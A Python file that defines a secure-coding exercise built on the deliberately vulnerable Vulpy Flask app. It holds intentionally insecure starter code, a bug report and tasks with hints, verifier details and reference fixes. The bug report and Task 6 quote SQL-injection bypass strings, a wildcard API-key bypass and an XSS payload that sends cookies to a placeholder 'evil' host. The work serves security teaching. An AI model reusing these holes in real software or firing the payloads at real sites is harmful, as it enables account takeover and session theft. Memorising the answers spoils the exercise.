"""
"Vulpy Security Review" project.

Starter code is adapted from the BAD (intentionally vulnerable) half of
https://github.com/fportantier/vulpy, rewritten to run on the Python standard
library only so it can execute inside the Nudge sandbox (no Flask,
cryptography or PyJWT). The secure GOOD half of vulpy is used as the
reference design for the mentor context and the curated solutions in
`ai_mentor.REFERENCE_SOLUTIONS`.
"""

from app.models import Project, ProjectFile, TaskItem

# ---------------------------------------------------------------------------
# Starter files (BAD versions)
# ---------------------------------------------------------------------------

SECURITY_REVIEW_MD = '''# Security Review Engagement: Vulpy

> Source: `fportantier/vulpy` - a deliberately vulnerable Flask micro-blog
> ("BAD" version) with a hardened "GOOD" counterpart. You are reviewing the
> BAD version and turning it into the GOOD one, one finding at a time.

## Background
Vulpy is a tiny Twitter-like app: users sign up, log in (optionally with TOTP
MFA), post short messages, browse other users' timelines, and call a JSON API
with an API key. It was "vibe-coded" with an AI assistant and shipped after
the happy-path demo worked.

A bug-bounty hunter has sent this report:

> 1. I logged in as `admin` with the username `admin' --` and any password.
> 2. Your users table stores passwords in clear text - I could read them from
>    the server logs because every SQL statement is printed.
> 3. I base64-decoded my `vulpy_session` cookie, changed my username to
>    `admin`, re-encoded it, and I was admin.
> 4. `X-APIKEY: *` authenticates me as a random user on `/api/post`.
> 5. I posted `<script>fetch('//evil/'+document.cookie)</script>` and every
>    visitor of my timeline sends me their session.
> 6. `/user/chpasswd` changes the password without asking for the old one.

## Scope (files you may edit)
| File | Responsibility | Vulpy origin |
|------|----------------|--------------|
| `libuser.py` | sign-up, login, password change, password policy | `bad/libuser.py` |
| `libsession.py` | session cookie create / load | `bad/libsession.py` |
| `libapi.py` | API key issuance & authentication | `bad/libapi.py` |
| `posts_view.py` | timeline HTML rendering + response headers | `bad/templates/posts.view.html`, `bad/vulpy.py` (CSP) |
| `FINDINGS.md` | your written report | - |

Read-only context: `vulpy_app.py` (Flask routes that call the libs, not run
in the sandbox), `db_init.py` (schema + seed users), `leaked_passwords.txt`.

## Rules of engagement
- Standard library only (`sqlite3`, `hashlib`, `hmac`, `secrets`, `html`, ...).
- Keep every public function signature - `vulpy_app.py` depends on them.
- Each task's **Run & Verify** fires real exploit payloads at your code.

## Out of scope (but note them in FINDINGS.md)
- `app.run(debug=True)` exposes the Werkzeug debugger => remote code execution.
- MFA disable endpoint is a state-changing GET with no CSRF protection.
- No login rate-limiting / account lockout (`failures` column is unused).
'''

FINDINGS_MD = '''# Findings Report - Vulpy

Fill this in as you work. A good finding has: title, severity, CWE, affected
code, proof-of-concept, impact, fix, and how you verified the fix.

| # | Finding | Severity | CWE | Status |
|---|---------|----------|-----|--------|
| 1 | SQL injection in `libuser.login` / `create` / `password_change` | Critical | CWE-89 | Open |
| 2 | Plaintext password storage + credentials in logs | High | CWE-256, CWE-532 | Open |
| 3 | Password change without re-authentication, no password policy | High | CWE-620, CWE-521 | Open |
| 4 | Unsigned, non-expiring session cookie | Critical | CWE-565, CWE-613 | Open |
| 5 | Predictable API keys + glob-wildcard auth bypass | Critical | CWE-338, CWE-155 | Open |
| 6 | Stored XSS on timeline + missing security headers | High | CWE-79, CWE-693 | Open |

## Finding 1 - SQL injection
- **PoC:**
- **Impact:**
- **Fix:**
- **Verification:**
'''

DB_INIT_PY = '''#!/usr/bin/env python3
"""
Vulpy database bootstrap (adapted from vulpy bad/db_init.py).

Seed users are created through `libuser.create`, so whatever storage format
you implement (plaintext today, salted hash after Task 2) is used consistently.
"""
import os
import sqlite3

import libuser

DB_USERS = "db_users.sqlite"
DB_POSTS = "db_posts.sqlite"

SEED_USERS = [
    ("admin", "SuperSecret"),
    ("elliot", "123123123"),
    ("tim", "12345678"),
]


def db_init_users():
    conn = sqlite3.connect(DB_USERS)
    c = conn.cursor()
    c.execute("DROP TABLE IF EXISTS users")
    c.execute(
        "CREATE TABLE users (username text, password text, salt text, "
        "failures int, mfa_enabled int, mfa_secret text)"
    )
    conn.commit()
    conn.close()

    for username, password in SEED_USERS:
        libuser.create(username, password)


def db_init_posts():
    conn = sqlite3.connect(DB_POSTS)
    c = conn.cursor()
    c.execute("DROP TABLE IF EXISTS posts")
    c.execute("CREATE TABLE posts (date date, username text, text text)")
    conn.commit()
    conn.close()


def reset():
    for name in (DB_USERS, DB_POSTS):
        try:
            os.remove(name)
        except FileNotFoundError:
            pass
    db_init_users()
    db_init_posts()


if __name__ == "__main__":
    reset()
'''

LIBUSER_PY = '''import sqlite3

DB_USERS = "db_users.sqlite"


def _connect():
    conn = sqlite3.connect(DB_USERS)
    conn.set_trace_callback(print)  # "helpful" debug logging of every SQL statement
    conn.row_factory = sqlite3.Row
    return conn


def login(username, password):
    """Return the username if the credentials are valid, otherwise False."""
    conn = _connect()
    c = conn.cursor()

    user = c.execute(
        "SELECT * FROM users WHERE username = '{}' and password = '{}'".format(username, password)
    ).fetchone()
    conn.close()

    if user:
        return user["username"]
    else:
        return False


def create(username, password):
    """Create a new user account."""
    conn = _connect()
    c = conn.cursor()

    c.execute(
        "INSERT INTO users (username, password, salt, failures, mfa_enabled, mfa_secret) "
        "VALUES ('%s', '%s', '%s', '%d', '%d', '%s')" % (username, password, "", 0, 0, "")
    )

    conn.commit()
    conn.close()
    return True


def userlist():
    conn = _connect()
    c = conn.cursor()

    users = c.execute("SELECT * FROM users").fetchall()
    conn.close()

    if not users:
        return []
    else:
        return [user["username"] for user in users]


def password_change(username, old_password, new_password):
    """Change a user's password. Called by /user/chpasswd."""
    conn = _connect()
    c = conn.cursor()

    c.execute("UPDATE users SET password = '{}' WHERE username = '{}'".format(new_password, username))
    conn.commit()
    conn.close()

    return True


def is_password_allowed(password):
    """Password policy used by sign-up and password change."""
    return True
'''

LIBSESSION_PY = '''import base64
import json
import time

SESSION_COOKIE = "vulpy_session"
SESSION_TTL = 7200  # seconds (2 hours)

# Copied from vulpy.py: app.config['SECRET_KEY'] = 'aaaaaaa'
SESSION_SECRET = "aaaaaaa"


def create(username, now=None):
    """
    Build the value of the `vulpy_session` cookie for `username`.
    `now` (unix seconds) is injectable for testing; default to time.time().
    """
    session = base64.b64encode(json.dumps({"username": username}).encode())
    return session.decode()


def load(cookie, now=None):
    """
    Parse a `vulpy_session` cookie value and return the session dict
    (e.g. {"username": "elliot"}), or {} if there is no valid session.
    """
    session = {}

    try:
        if cookie:
            decoded = base64.b64decode(cookie.encode())
            if decoded:
                session = json.loads(decoded)
    except Exception:
        pass

    return session


def cookie_attributes():
    """Keyword arguments passed to Flask's response.set_cookie()."""
    return {"httponly": False, "secure": False, "samesite": None}
'''

LIBAPI_PY = '''import hashlib
import random
from pathlib import Path

import libuser

KEY_DIR = Path("apikeys")


def keygen(username, password=None):
    """Issue a new API key for `username` (revoking previous ones)."""
    if password:
        if not libuser.login(username, password):
            return None

    key = hashlib.sha256(str(random.getrandbits(2048)).encode()).hexdigest()

    KEY_DIR.mkdir(exist_ok=True)
    for f in KEY_DIR.glob("vulpy.apikey." + username + ".*"):
        print("removing", f)
        f.unlink()

    keyfile = KEY_DIR / "vulpy.apikey.{}.{}".format(username, key)
    keyfile.touch()

    return key


def authenticate(headers):
    """Return the username owning the X-APIKEY header, or None."""
    if "X-APIKEY" not in headers:
        return None

    key = headers["X-APIKEY"]

    for f in KEY_DIR.glob("vulpy.apikey.*." + key):
        return f.name.split(".")[2]

    return None
'''

POSTS_VIEW_PY = '''"""
Python port of vulpy's templates/posts.view.html.

The original Jinja template renders post bodies with `{{ post.text | safe }}`,
which disables auto-escaping. These helpers reproduce that behaviour.
"""


def render_posts(username, posts):
    """Render a user's timeline: heading + list of post bodies."""
    items = "".join(
        f'<li><span class="w3-h3">{post["text"]}</span></li>' for post in posts
    )
    return (
        f'<h2 class="w3-wide">{username}</h2>'
        f'<ul class="w3-ul w3-left-align w3-border">{items}</ul>'
    )


def render_user_link(user):
    """Render one entry of the 'Other users' sidebar."""
    return f'<li><a href="/posts/{user}">{user}</a></li>'


def security_headers():
    """
    Headers added to every response by the app's after_request hook.
    (vulpy loads a CSP from csp.txt, but the file was never deployed.)
    """
    return {}
'''

VULPY_APP_PY = '''#!/usr/bin/env python3
"""
READ-ONLY CONTEXT - condensed Flask wiring of vulpy (bad/vulpy.py + mod_*.py).
Not executed in the Nudge sandbox (Flask is not installed); it shows how the
libraries you are fixing are called from HTTP handlers.
"""
from flask import Flask, g, jsonify, make_response, redirect, request

import libapi
import libsession
import libuser
import posts_view

app = Flask("vulpy")


@app.before_request
def before_request():
    g.session = libsession.load(request.cookies.get(libsession.SESSION_COOKIE))


@app.after_request
def add_security_headers(response):
    for name, value in posts_view.security_headers().items():
        response.headers[name] = value
    return response


@app.route("/user/login", methods=["POST"])
def do_login():
    username = libuser.login(request.form.get("username"), request.form.get("password"))
    if not username:
        return "Invalid user or password", 401
    response = make_response(redirect("/"))
    response.set_cookie(
        libsession.SESSION_COOKIE,
        libsession.create(username),
        **libsession.cookie_attributes(),
    )
    return response


@app.route("/user/chpasswd", methods=["POST"])
def do_chpasswd():
    if "username" not in g.session:
        return redirect("/user/login")
    ok = libuser.password_change(
        g.session["username"],
        request.form.get("current_password"),
        request.form.get("new_password"),
    )
    return ("Password changed", 200) if ok else ("Password change rejected", 400)


@app.route("/posts/<username>")
def do_view(username):
    posts = []  # libposts.get_posts(username) - parameterized already
    page = posts_view.render_posts(username, posts)
    page += "".join(posts_view.render_user_link(u) for u in libuser.userlist())
    return page


@app.route("/api/key", methods=["POST"])
def do_key_create():
    data = request.get_json()
    key = libapi.keygen(data.get("username"), data.get("password"))
    return (jsonify({"key": key}), 200) if key else ("Invalid credentials", 403)


@app.route("/api/post", methods=["POST"])
def do_api_post():
    username = libapi.authenticate(request.headers)
    if not username:
        return "Unauthorized", 401
    return jsonify({"status": "ok", "user": username})


# Out of scope finding: the Werkzeug debugger allows arbitrary code execution.
app.run(debug=True, host="127.0.1.1", port=5000)
'''

LEAKED_PASSWORDS_TXT = '''123456
12345678
123123123
123456789
1234567890
password
password1
password123
password1234
qwerty
qwertyuiop
qwertyuiop123
iloveyou
iloveyou12345
letmein
letmein123456
admin
admin123456789
welcome
welcome12345
SuperSecret
monkey
dragon
football
baseball
sunshine
princess
trustno1
correcthorsebatterystaple
'''

# ---------------------------------------------------------------------------
# Project definition
# ---------------------------------------------------------------------------

VULPY_PROJECT = Project(
    id="vulpy-security-review",
    title="Security Review: Harden the Vulpy Flask App (BAD -> GOOD)",
    subtitle="Audit a deliberately vulnerable Python web app and fix six real findings, exploit-verified.",
    difficulty="Advanced",
    category="Application Security Review",
    tags=["OWASP Top 10", "SQL Injection", "Auth & Sessions", "XSS", "Cryptography", "Python"],
    estimated_minutes=120,
    problem_statement=(
        "Vulpy is a small Flask micro-blog (sign-up, login, timelines, JSON API) that an AI assistant generated "
        "end-to-end. It demos perfectly, but a bug-bounty report lists six exploitable flaws: SQL-injection login "
        "bypass, plaintext passwords leaking through SQL trace logs, a password change that never asks for the old "
        "password, a base64 session cookie anyone can forge, API keys that accept `*` as a valid key, and stored XSS "
        "on every timeline. You are the security reviewer: reproduce each finding, fix it in the library layer, and "
        "prove the fix with the exploit-driven verifier. The codebase is adapted from the BAD half of "
        "github.com/fportantier/vulpy; the GOOD half is the target design."
    ),
    system_context=(
        "Request flow: Flask route (`vulpy_app.py`) -> library (`libuser`, `libsession`, `libapi`, `posts_view`) -> "
        "SQLite (`db_users.sqlite`, schema in `db_init.py`). Identity is established by `libuser.login`, carried in "
        "the `vulpy_session` cookie built by `libsession`, and for the API by `libapi` keys. Rendering happens in "
        "`posts_view`. Every trust boundary - SQL, password storage, cookies, API credentials, HTML output - is "
        "currently broken. Defence must be done with the Python standard library only."
    ),
    ai_failure_mode=(
        "AI assistants reproduce the most common snippets on the internet: SQL via `.format()`/`%`, storing the "
        "password column as typed, base64-encoding JSON and calling it a 'session token', `random` for secrets, "
        "building filesystem globs from user input, and `| safe` / f-string HTML to 'make the formatting work'. "
        "Each looks fine in a happy-path demo and each is a textbook OWASP Top 10 vulnerability."
    ),
    starter_files=[
        ProjectFile(path="SECURITY_REVIEW.md", language="markdown", content=SECURITY_REVIEW_MD, read_only=True),
        ProjectFile(path="libuser.py", language="python", content=LIBUSER_PY),
        ProjectFile(path="libsession.py", language="python", content=LIBSESSION_PY),
        ProjectFile(path="libapi.py", language="python", content=LIBAPI_PY),
        ProjectFile(path="posts_view.py", language="python", content=POSTS_VIEW_PY),
        ProjectFile(path="FINDINGS.md", language="markdown", content=FINDINGS_MD),
        ProjectFile(path="vulpy_app.py", language="python", content=VULPY_APP_PY, read_only=True),
        ProjectFile(path="db_init.py", language="python", content=DB_INIT_PY, read_only=True),
        ProjectFile(path="leaked_passwords.txt", language="plaintext", content=LEAKED_PASSWORDS_TXT, read_only=True),
    ],
    tasks=[
        # ------------------------------------------------------------------
        TaskItem(
            id="vulpy-task-1-sqli",
            order=1,
            title="Kill the SQL Injection Login Bypass",
            category="security",
            objective="Make every query in `libuser.py` use parameterized `?` placeholders so user input can never change SQL structure.",
            instructions=(
                "**Finding #1 (Critical, CWE-89).** `login()` builds\n"
                "`SELECT * FROM users WHERE username = '{}' and password = '{}'` with `.format()`. Submitting the "
                "username `admin' --` turns the rest of the statement into a comment and logs you in as admin with "
                "any password. `create()` (`%` formatting) and `password_change()` (`.format()`) have the same flaw.\n\n"
                "**Steps**\n"
                "1. Reproduce: trace what SQL `login(\"admin' --\", \"x\")` produces (the trace callback prints it).\n"
                "2. Rewrite `login`, `create` and `password_change` to pass values as a tuple: "
                "`c.execute(\"... WHERE username = ?\", (username,))`.\n"
                "3. Make sure *no* SQL string anywhere in the file is assembled with `format()`, `%`, f-strings or `+`.\n"
                "4. Confirm a legitimate user named `o'brien` can now sign up and log in (quotes are data, not syntax).\n\n"
                "Keep storing the password as-is for now - hashing is Task 2."
            ),
            validation_criteria=[
                "Authentication-bypass payloads (`admin' --`, `' OR '1'='1`) no longer log in",
                "Usernames/passwords containing quotes round-trip through `create` and `login`",
                "No SQL string in `libuser.py` is built with format(), %, f-strings or +",
            ],
            hints=[
                "Ask yourself: what is the difference between *code* and *data* in an SQL statement, and which one is `username` right now?",
                "`sqlite3` supports `?` placeholders: `c.execute(\"SELECT * FROM users WHERE username = ? AND password = ?\", (username, password))`.",
                "Do the same for INSERT (6 placeholders) and UPDATE (`SET password = ? WHERE username = ?`). Search the file for `.format(` and ` % (` - there should be none left in SQL.",
            ],
            target_file="libuser.py",
            mentor_context=(
                "CWE-89 / OWASP A03:2021 Injection / ASVS 5.3.4. Vulpy BAD `libuser.login` uses `.format()`; vulpy GOOD "
                "selects by `username = ?` only and verifies the password in Python. Exploit mechanics: `admin' --` -> "
                "`WHERE username = 'admin' --' and password = 'x'`; `' OR '1'='1' --` returns the first row (admin). "
                "Password payload `' OR '1'='1` also works because AND binds tighter than OR. Verifier behaviour: resets "
                "the DB via db_init.reset() (seeds admin/SuperSecret, elliot/123123123, tim/12345678 through "
                "libuser.create), fires the three payloads at login, creates `o'brien` with password "
                "`Gr33n'Tea&Biscuits!` and logs in, then AST-scans libuser.py for SQL-keyword string literals combined "
                "with %, +, .format() or f-strings (assigning the query to a variable first does NOT evade it). "
                "Common wrong fixes to steer away from: escaping quotes with `.replace(\"'\", \"''\")` (fragile, fails "
                "the static check), blacklisting `--`/`OR`, or wrapping in try/except. Teaching point: parameterization "
                "separates the query plan from the data; the DB driver never parses values as SQL."
            ),
        ),
        # ------------------------------------------------------------------
        TaskItem(
            id="vulpy-task-2-password-storage",
            order=2,
            title="Store Passwords with a Salted, Slow KDF and Stop Logging Credentials",
            category="security",
            objective="Replace plaintext password storage with per-user-salted `hashlib.scrypt`, verify in constant time, and remove the SQL trace logger.",
            instructions=(
                "**Finding #2 (High, CWE-256 + CWE-532).** The `password` column stores exactly what the user typed, "
                "and `_connect()` calls `conn.set_trace_callback(print)`, so every INSERT/SELECT - including the "
                "password - is printed to the server log. One leaked log file or DB backup = every account compromised "
                "(and reused on other sites).\n\n"
                "**Steps**\n"
                "1. Remove the `set_trace_callback(print)` line (never log statements that contain secrets).\n"
                "2. In `create()`: generate `salt = os.urandom(16)`, derive "
                "`hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1, dklen=32)`, and store "
                "`digest.hex()` in `password` and `salt.hex()` in `salt` (the column already exists).\n"
                "3. In `login()`: `SELECT` the row by username only, re-derive the hash with the stored salt, and "
                "compare with `hmac.compare_digest`.\n"
                "4. Factor the hashing into a helper (e.g. `_hash_password(password, salt)`) - Task 3 reuses it.\n"
                "5. Make `password_change()` store a new salt + hash too, so changed passwords are not plaintext.\n\n"
                "Use scrypt with the parameters above (~60 ms/hash); much slower settings will hit the sandbox timeout."
            ),
            validation_criteria=[
                "The `password` column never contains the plaintext (or an unsalted MD5/SHA digest)",
                "Identical passwords get different stored hashes (per-user salt) and login still verifies",
                "Use a slow KDF (`hashlib.scrypt` / `pbkdf2_hmac`) and `hmac.compare_digest`",
                "No plaintext credentials are written to stdout/logs",
            ],
            hints=[
                "If an attacker steals `db_users.sqlite` tomorrow, what do they learn? And what does `set_trace_callback(print)` write to your logs every time someone logs in?",
                "You need three primitives: `os.urandom(16)` for the salt, `hashlib.scrypt(pw.encode(), salt=salt, n=2**14, r=8, p=1, dklen=32)` to derive, `hmac.compare_digest(a, b)` to compare.",
                "login(): `row = c.execute(\"SELECT * FROM users WHERE username = ?\", (username,)).fetchone()` -> if no row return False -> `candidate = _hash_password(password, bytes.fromhex(row['salt']))` -> `if hmac.compare_digest(candidate.hex(), row['password']): return row['username']`.",
            ],
            target_file="libuser.py",
            mentor_context=(
                "CWE-256 Plaintext Storage of a Password, CWE-916 weak hash, CWE-532 sensitive info in logs; OWASP A02:2021 "
                "Cryptographic Failures / A09 Logging; ASVS 2.4.1-2.4.5. Vulpy GOOD uses cryptography's Scrypt(n=2**14, "
                "r=8, p=1, length=32) with a 16-byte os.urandom salt stored hex-encoded in a `salt` column, and "
                "`kdf.verify` - the stdlib equivalent is hashlib.scrypt + hmac.compare_digest. Why slow KDF: MD5/SHA-256 "
                "do billions of guesses/sec on GPUs; scrypt is memory-hard. Why salt: defeats rainbow tables and hides "
                "users sharing a password. Verifier behaviour: creates alice and bob with the same password "
                "`Tr0ub4dor&3-Horse!` while capturing stdout, checks alice's stored password is not the plaintext nor "
                "md5/sha1/sha256 hex of it, checks alice != bob stored values, login(correct) == 'alice' and "
                "login(wrong) falsy, static-checks for 'scrypt' or 'pbkdf2_hmac' and 'compare_digest' in source, and "
                "fails if the plaintext appears in captured stdout. Salt can live in the `salt` column or be embedded "
                "in the password string (e.g. `scrypt$<salt>$<hash>`) - both pass. Task 1's checks must keep passing "
                "(parameterized queries). Advanced extra credit: hash a dummy password when the user does not exist "
                "to avoid username enumeration by timing. Sandbox timeout is ~10s total; pbkdf2 with 600k iterations "
                "per call may be too slow across ~8 hashes, so recommend scrypt n=2**14."
            ),
        ),
        # ------------------------------------------------------------------
        TaskItem(
            id="vulpy-task-3-password-change",
            order=3,
            title="Re-authenticate on Password Change and Enforce a Password Policy",
            category="security",
            objective="`password_change` must verify the current password and reject weak or breached new passwords via `is_password_allowed`.",
            instructions=(
                "**Finding #3 (High, CWE-620 + CWE-521).** `/user/chpasswd` calls "
                "`libuser.password_change(username, old_password, new_password)`, but the function ignores "
                "`old_password` entirely and `is_password_allowed()` always returns `True`. Anyone holding a stolen "
                "session cookie (Task 4) or a CSRF'd form submit can permanently take over the account, and users can "
                "set `123` as their password.\n\n"
                "**Steps**\n"
                "1. Implement `is_password_allowed(password)`: at least **12 characters** AND not present in "
                "`leaked_passwords.txt` (one password per line, exact match; open it relative to "
                "`Path(__file__).parent`).\n"
                "2. In `password_change`: return `False` unless `login(username, old_password)` succeeds.\n"
                "3. Return `False` if `is_password_allowed(new_password)` is false.\n"
                "4. Otherwise store a **new salt + scrypt hash** (reuse your Task 2 helper) and return `True`.\n"
                "5. Order matters: never mutate the DB before both checks pass."
            ),
            validation_criteria=[
                "`is_password_allowed` rejects passwords shorter than 12 chars and any in leaked_passwords.txt",
                "`password_change` refuses (returns False) when the current password is wrong",
                "`password_change` refuses weak or leaked new passwords and leaves the old one working",
                "A valid change returns True, the new password logs in and the old one no longer does",
            ],
            hints=[
                "If someone walks up to an unlocked laptop with your session open, what should stop them from changing your password?",
                "Gate the function with `if not login(username, old_password): return False` and `if not is_password_allowed(new_password): return False` before any UPDATE.",
                "Policy: `len(password) >= 12 and password not in leaked_set`, where `leaked_set = set((Path(__file__).parent / 'leaked_passwords.txt').read_text().split())`. Then generate a fresh salt, hash, and `UPDATE users SET password = ?, salt = ? WHERE username = ?`.",
            ],
            target_file="libuser.py",
            mentor_context=(
                "CWE-620 Unverified Password Change, CWE-521 Weak Password Requirements; OWASP A07:2021 Identification "
                "and Authentication Failures; ASVS 2.1.1 (>=12 chars), 2.1.7 (breached password check), 2.1.5/3.x "
                "(re-auth for sensitive ops). NIST 800-63B recommends length + breach-list over composition rules. "
                "Vulpy GOOD: `password_change(username, old_password, new_password)` -> `login()` check -> "
                "`is_password_allowed` = `is_password_complex` (len>=12) and not `is_password_leaked` (reads "
                "leaked_passwords.txt) -> `password_set` with fresh salt. Verifier behaviour: DB reset; "
                "is_password_allowed('Sh0rt!')/('password1234')/('qwertyuiop123') must be falsy and "
                "('violet-Rocket-Harbor-42!') truthy; password_change('tim','wrong-current-password', strong) falsy "
                "with tim's old password '12345678' still working; password_change('tim','12345678','123') and "
                "(... 'password1234') falsy; finally password_change('tim','12345678', strong) truthy, login new == "
                "'tim', login old falsy. Note seed users are created via libuser.create, which does NOT enforce the "
                "policy (that's intentional - only password_change is in scope). Depends on Tasks 1-2 working "
                "(login must verify hashes). Pitfall: reading leaked_passwords.txt with a relative path works in the "
                "sandbox but Path(__file__).parent is more robust; strip whitespace/newlines when building the set."
            ),
        ),
        # ------------------------------------------------------------------
        TaskItem(
            id="vulpy-task-4-session-forgery",
            order=4,
            title="Replace the Forgeable Base64 Session with a Signed, Expiring Token",
            category="security",
            objective="Make `vulpy_session` tamper-proof (HMAC-SHA256 with a strong secret), expire after `SESSION_TTL`, and set HttpOnly/Secure/SameSite.",
            instructions=(
                "**Finding #4 (Critical, CWE-565 + CWE-613).** `libsession.create()` returns "
                "`base64(json({\"username\": ...}))`. Base64 is an *encoding*, not a signature: decode it, change "
                "`elliot` to `admin`, re-encode, done. Sessions also never expire, the only 'secret' is the hard-coded "
                "`'aaaaaaa'`, and the cookie is readable from JavaScript.\n\n"
                "**Steps**\n"
                "1. `SESSION_SECRET`: load from `os.environ.get(\"VULPY_SESSION_SECRET\")`, falling back to "
                "`secrets.token_bytes(32)` - never a literal in source. Must be >= 32 bytes.\n"
                "2. `create(username, now=None)`: payload `{\"username\": u, \"exp\": now + SESSION_TTL}` -> "
                "URL-safe base64 -> append `.` + hex/base64 of `hmac.new(SESSION_SECRET, payload_b64, sha256)`.\n"
                "3. `load(cookie, now=None)`: split on `.`, recompute the HMAC, compare with `hmac.compare_digest`, "
                "then decode and reject if `exp < now`. Return `{}` (never raise) for anything invalid, including "
                "`None` / empty / garbage.\n"
                "4. Honour the `now` argument in both functions (`now = time.time() if now is None else now`).\n"
                "5. `cookie_attributes()`: return `{\"httponly\": True, \"secure\": True, \"samesite\": \"Lax\"}`."
            ),
            validation_criteria=[
                "Hand-crafted base64 `{\"username\": \"admin\"}` cookies are rejected",
                "Cookies are HMAC-signed with a strong (>=32 byte) secret; tampering is detected and garbage returns {}",
                "Sessions older than SESSION_TTL are rejected; signature compared with `hmac.compare_digest`",
                "`cookie_attributes()` sets HttpOnly, Secure and SameSite=Lax/Strict",
            ],
            hints=[
                "Open your browser devtools and base64-decode the cookie. What stops you from editing it? What would a server need to *prove* it issued this value?",
                "Sign the encoded payload: `sig = hmac.new(SESSION_SECRET, payload_b64.encode(), hashlib.sha256).hexdigest()`; cookie = `f\"{payload_b64}.{sig}\"`. Make SESSION_SECRET bytes, e.g. `secrets.token_bytes(32)`.",
                "load(): `payload_b64, sig = cookie.rsplit('.', 1)` inside try -> `if not hmac.compare_digest(sig, expected): return {}` -> `data = json.loads(base64.urlsafe_b64decode(payload_b64))` -> `if data['exp'] < now: return {}` -> `return {'username': data['username']}`.",
            ],
            target_file="libsession.py",
            mentor_context=(
                "CWE-565 Reliance on Cookies without Validation and Integrity Checking, CWE-613 Insufficient Session "
                "Expiration, CWE-798 hard-coded secret, CWE-1004 cookie without HttpOnly; OWASP A07:2021 / A02; ASVS "
                "3.2.x-3.4.x. Vulpy BAD: base64 JSON. Vulpy GOOD: Fernet (AES-CBC + HMAC) token with ttl=7200 and a "
                "country binding via GeoIP; since `cryptography` is unavailable, HMAC-SHA256 over the payload gives "
                "integrity (confidentiality is not required for a username). Important nuance: the signature must cover "
                "the expiry, otherwise an attacker extends the session. Verifier behaviour: load() of 3 forged cookies "
                "(std b64, urlsafe b64, urlsafe b64 + '.AAAA') must not yield a username; SESSION_SECRET must exist, "
                "len>=32, not 'aaaaaaa'; load(create('elliot'))['username']=='elliot'; flipping one char at 1/4, 1/2, 3/4 "
                "of the cookie must invalidate it; load('not-a-cookie'/''/'....'/None) must return {} without raising; "
                "create('elliot', now=now-8000) loaded with now=now must be rejected, create(now=now-60) accepted; "
                "'compare_digest' in source; cookie_attributes() keys case-insensitive httponly=True, secure=True, "
                "samesite lax/strict. Pitfalls: comparing with `==` (timing), catching exceptions too narrowly so "
                "garbage raises, regenerating the secret per call (then round-trip fails), using bytes vs str "
                "inconsistently in hmac.new (key must be bytes). Note: a random per-process secret logs everyone out on "
                "restart and breaks multi-worker deployments - in prod, load it from env/secret manager."
            ),
        ),
        # ------------------------------------------------------------------
        TaskItem(
            id="vulpy-task-5-api-keys",
            order=5,
            title="Fix API Key Wildcard Bypass, Predictable Keys and Plaintext Key Storage",
            category="architecture",
            objective="Require credentials to mint keys, generate them with `secrets`, store only their SHA-256 digest, and authenticate by exact digest lookup.",
            instructions=(
                "**Finding #5 (Critical, CWE-155 + CWE-338 + CWE-312).** `libapi` has stacked flaws:\n"
                "- `keygen(username)` with no password skips authentication (`if password:`) - anyone can mint a key "
                "for any user.\n"
                "- Keys come from `random.getrandbits` (Mersenne Twister - predictable once enough outputs are seen).\n"
                "- Keys are stored *in plaintext* as filenames, and `authenticate()` passes the header straight into "
                "`Path.glob()`: `X-APIKEY: *` matches the first key file and logs you in as that user. A username of "
                "`*` in keygen would delete every user's keys.\n\n"
                "**Steps**\n"
                "1. `keygen`: always require `libuser.login(username, password)`; return `None` otherwise.\n"
                "2. Generate keys with `secrets.token_hex(32)`; remove the `random` import.\n"
                "3. Store only `hashlib.sha256(key.encode()).hexdigest()` -> username (an in-memory dict like "
                "`_KEY_DIGESTS` or a sqlite table). Revoke the user's previous digest on re-issue. Drop the glob/file "
                "store.\n"
                "4. `authenticate(headers)`: missing header -> `None`; hash the presented key and look it up exactly "
                "(dict lookup on a fixed-length digest, or `hmac.compare_digest` when scanning). Never interpret the "
                "key as a pattern."
            ),
            validation_criteria=[
                "`keygen` only issues keys after a valid username + password",
                "Wildcard/glob keys (`*`, `?...`, `[0-9a-f]*`) never authenticate; the real key does",
                "Keys are generated with the `secrets` CSPRNG (no `random` import), >=32 chars, unique",
                "The raw API key is never stored at rest (only a digest)",
            ],
            hints=[
                "What does the string `*` mean to `Path.glob()`? And who gets a key if `password` is `None`?",
                "`secrets.token_hex(32)` gives 64 hex chars from the OS CSPRNG. Store `hashlib.sha256(key.encode()).hexdigest()` instead of the key itself.",
                "Keep `_KEY_DIGESTS: dict[str, str] = {}` (digest -> username). keygen: login check -> delete old digests for that user -> add new digest -> return key. authenticate: `key = headers.get('X-APIKEY'); if not key: return None; return _KEY_DIGESTS.get(hashlib.sha256(key.encode()).hexdigest())`.",
            ],
            target_file="libapi.py",
            mentor_context=(
                "CWE-155 Improper Neutralization of Wildcards, CWE-338 Weak PRNG, CWE-312/CWE-522 credentials stored in "
                "cleartext, CWE-306 missing authentication for critical function; OWASP A01/A07/A02; ASVS 2.9, 6.3.1 "
                "(CSPRNG), 2.10.x (service credentials). Vulpy BAD stores `/tmp/vulpy.apikey.<user>.<key>` files and "
                "globs with the header value. Vulpy GOOD switched to short-lived JWT bearer tokens (PyJWT, HS256, "
                "exp=60s); PyJWT isn't available here so the hashed opaque key pattern (like GitHub/Stripe tokens) is "
                "the target. Why hash API keys but not salt/slow-hash them: keys are 256-bit random, so brute force is "
                "infeasible and SHA-256 is sufficient; a lookup-by-digest also avoids timing leaks on the secret. "
                "Verifier behaviour: DB reset; keygen('elliot') and keygen('elliot','nope') and keygen('*','x') must be "
                "falsy; keygen('elliot','123123123') must return a str; authenticate({'X-APIKEY': p}) for "
                "'*', '?'*len, '[0-9a-f]*', '*'+last4, '../*', key[:-1]+'*' must be falsy; authenticate with real key "
                "== 'elliot'; authenticate({}) falsy; AST: no `random` import and `secrets` imported; a second keygen "
                "returns a different key, len>=32; then walks the sandbox dir (non-.py files, names + contents incl. "
                "sqlite DBs) and module-level dict/set/list globals looking for the raw latest key. Depends on "
                "libuser.login (Tasks 1-2). The `headers` arg is a plain dict in tests (Flask passes a case-insensitive "
                "Headers object in prod); `.get('X-APIKEY')` works for both."
            ),
        ),
        # ------------------------------------------------------------------
        TaskItem(
            id="vulpy-task-6-xss-headers",
            order=6,
            title="Escape Timeline Output and Ship Defense-in-Depth Security Headers",
            category="security",
            objective="HTML-escape every user-controlled value in `posts_view.py` and return a strict CSP, nosniff and anti-framing headers.",
            instructions=(
                "**Finding #6 (High, CWE-79 + CWE-693).** The timeline template renders `{{ post.text | safe }}` - the "
                "Python port interpolates post bodies and usernames straight into HTML. A post of "
                "`<script>fetch('//evil/'+document.cookie)</script>` executes for every visitor (before Task 4's "
